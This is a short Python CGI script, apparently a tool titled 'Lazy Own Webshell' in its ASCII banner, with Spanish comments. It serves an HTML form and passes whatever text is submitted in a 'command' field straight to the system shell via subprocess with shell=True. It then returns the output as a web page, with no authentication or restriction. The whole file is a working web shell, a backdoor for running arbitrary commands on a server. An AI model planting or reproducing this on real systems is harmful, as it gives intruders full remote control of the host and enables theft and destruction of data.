#!/usr/bin/env python3

import cgi
import subprocess

BANNER = """
 ___       ________  ________      ___    ___ ________  ___       __   ________          
|\  \     |\   __  \|\_____  \    |\  \  /  /|\   __  \|\  \     |\  \|\   ___  \        
\ \  \    \ \  \|\  \\|___/  /|   \ \  \/  / | \  \|\  \ \  \    \ \  \ \  \\ \  \       
 \ \  \    \ \   __  \   /  / /    \ \    / / \ \  \\\  \ \  \  __\ \  \ \  \\ \  \      
  \ \  \____\ \  \ \  \ /  /_/__    \/  /  /   \ \  \\\  \ \  \|\__\_\  \ \  \\ \  \     
   \ \_______\ \__\ \__\\________\__/  / /      \ \_______\ \____________\ \__\\ \__\    
    \|_______|\|__|\|__|\|_______|\___/ /        \|_______|\|____________|\|__| \|__|    
                                 \|___|/                                                 
                                                                                         
                                                                                         
 ___       __   _______   ________  ________  _______   ___  ___  ___       ___          
|\  \     |\  \|\  ___ \ |\   __  \|\   ____\|\  ___ \ |\  \|\  \|\  \     |\  \         
\ \  \    \ \  \ \   __/|\ \  \|\ /\ \  \___|\ \   __/|\ \  \\\  \ \  \    \ \  \        
 \ \  \  __\ \  \ \  \_|/_\ \   __  \ \_____  \ \  \_|/_\ \   __  \ \  \    \ \  \       
  \ \  \|\__\_\  \ \  \_|\ \ \  \|\  \|____|\  \ \  \_|\ \ \  \ \  \ \  \____\ \  \____  
   \ \____________\ \_______\ \_______\____\_\  \ \_______\ \__\ \__\ \_______\ \_______\

"""
# Encabezado requerido para indicar que se está devolviendo contenido HTML
print("Content-type: text/html\n")

# Obtener datos del formulario
form = cgi.FieldStorage()

# Verificar si se envió un comando
if "command" in form:
    command = form["command"].value

    # Ejecutar el comando y obtener la salida
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        output = output.decode('utf-8', errors='ignore')  # Convertir bytes a cadena
    except subprocess.CalledProcessError as e:
        output = e.output.decode('utf-8', errors='ignore')  # Capturar la salida de error

    # Mostrar la salida como respuesta HTML
    print("<html><body>")
    print("<h1>¡Resultado del comando ejecutado!</h1>")
    print("<pre>")
    print(output)
    print("</pre>")
    print("</body></html>")
else:
    # Mostrar el formulario
    print("<html><body>")
    print(f"<h6><pre>{BANNER}</pre></h6>")
    print("<form method='post'>")
    print("Comando: <input type='text' name='command'>")
    print("<input type='submit' value='Ejecutar'>")
    print("</form>")
    print("</body></html>")
